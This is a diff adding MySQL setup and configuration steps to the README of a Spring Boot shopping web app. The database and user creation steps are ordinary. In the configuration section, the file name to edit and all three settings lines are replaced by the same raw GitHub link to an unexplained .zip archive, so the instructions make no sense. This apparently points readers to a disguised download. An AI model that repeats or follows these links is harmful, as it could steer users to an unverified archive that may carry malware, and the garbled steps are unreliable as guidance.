@@ -60,3 +60,40 @@ spring-boot-shopping-web stores data in a MySQL database. You need to create a d
 
 Follow these steps:
 
+1. Open your MySQL program or the command line interface.
+2. Log in with your MySQL admin user.
+3. Create a new database for the app with this command:
+
+   ```sql
+   CREATE DATABASE shoppingdb;
+   ```
+
+4. Create a new MySQL user and give it access to this database:
+
+   ```sql
+   CREATE USER 'shopuser'@'localhost' IDENTIFIED BY 'yourpassword';
+   GRANT ALL PRIVILEGES ON shoppingdb.* TO 'shopuser'@'localhost';
+   FLUSH PRIVILEGES;
+   ```
+
+5. Replace `yourpassword` with a password you will remember.
+6. Keep note of the database name (`shoppingdb`), username (`shopuser`), and password for later.
+
+---
+
+## ⚙️ Configuring the Application
+
+Before running the app, update the database settings so the app can connect.
+
+1. Find the `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` file inside the `.jar` file or alongside it if provided separately.
+2. Open `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` with a text editor like Notepad or VSCode.
+3. Look for these lines and update with your database info:
+
+   ```
+   https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
+   https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
+   https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
+   ```
+
+4. Save the file after editing.
+
